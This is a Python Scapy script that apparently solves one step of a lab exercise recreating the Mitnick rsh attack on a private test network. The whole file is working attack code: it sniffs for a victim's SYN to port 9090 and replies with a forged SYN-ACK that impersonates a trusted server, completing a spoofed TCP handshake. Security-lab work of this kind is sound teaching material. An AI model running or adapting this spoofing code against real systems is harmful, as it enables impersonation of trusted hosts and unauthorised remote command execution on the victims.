#!/usr/bin/env python3
from scapy.all import *

X_IP = "10.9.0.5"
SERVER_IP = "10.9.0.6"
IFACE = "br-50741950180a"
TARGET_PORT = 9090  # Must match the port in your RSH data from Task 2.1


def handle_second_syn(pkt):
    if (pkt.haslayer(TCP) and pkt[TCP].flags == "S" and
            pkt[IP].src == X_IP and pkt[IP].dst == SERVER_IP and
            pkt[TCP].dport == TARGET_PORT):
        print(f"[+] Captured SYN for 2nd connection from {pkt[IP].src}:{pkt[TCP].sport} to port {TARGET_PORT}")
        print(f"    X-Terminal Seq: {pkt[TCP].seq}")

        # Craft spoofed SYN-ACK from the Trusted Server
        ip = IP(src=SERVER_IP, dst=X_IP)
        tcp = TCP(sport=TARGET_PORT, dport=pkt[TCP].sport, flags="SA",
                  seq=2000, ack=pkt[TCP].seq + 1)

        print("[-] Sending spoofed SYN-ACK...")
        send(ip / tcp, verbose=0)
        print("[+] Spoofed SYN-ACK sent. Second TCP handshake initiated.")

        # Keep the script running. The final ACK from X-Terminal may come naturally.
        print("[*] Task 2.2 active. Waiting for possible final ACK...")


if __name__ == "__main__":
    print("[*] Starting Task 2.2: Spoof the Second TCP Connection")
    print(f"[*] Listening on interface {IFACE} for SYN to port {TARGET_PORT}...")
    sniff(filter=f"tcp and host {X_IP} and host {SERVER_IP} and dst port {TARGET_PORT}",
          prn=handle_second_syn,
          iface=IFACE,
          store=0)
